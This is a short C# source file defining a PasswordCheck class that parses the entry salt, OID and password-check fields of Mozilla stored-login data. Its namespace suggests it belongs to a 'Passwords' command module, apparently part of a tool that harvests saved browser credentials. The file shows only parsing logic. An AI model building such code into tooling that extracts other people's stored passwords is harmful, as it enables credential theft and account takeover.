using System.Globalization;

namespace Orcus.Commands.Passwords.Applications.Mozilla.Cryptography
{
    public class PasswordCheck
    {
        public PasswordCheck(string dataToParse)
        {
            int entrySaltLength = int.Parse(dataToParse.Substring(2, 2), NumberStyles.HexNumber)*2;
            EntrySalt = dataToParse.Substring(6, entrySaltLength);

            int oidLength = dataToParse.Length - (6 + entrySaltLength + 36);
            Oid = dataToParse.Substring(6 + entrySaltLength + 36, oidLength);

            Passwordcheck = dataToParse.Substring(6 + entrySaltLength + 4 + oidLength);
        }

        public string EntrySalt { get; private set; }
        public string Oid { get; private set; }
        public string Passwordcheck { get; private set; }
    }
}